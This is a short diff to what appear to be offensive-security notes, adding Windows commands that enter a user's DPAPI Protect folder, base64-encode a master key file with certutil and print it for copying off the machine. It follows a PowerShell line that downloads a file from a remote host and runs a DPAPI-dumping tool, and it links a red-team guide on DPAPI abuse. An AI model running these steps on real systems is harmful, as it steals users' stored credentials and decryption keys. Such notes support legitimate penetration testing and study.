@@ -142,6 +142,16 @@ powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://
 sb.exe MasterKeys
 sb.exe users
 
+# cd to MasterKey file directory
+cd C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001
+
+# encode and print the masterkey
+certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
+
+# save it into local machine
+type output 
+
+
 https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
 ```
 
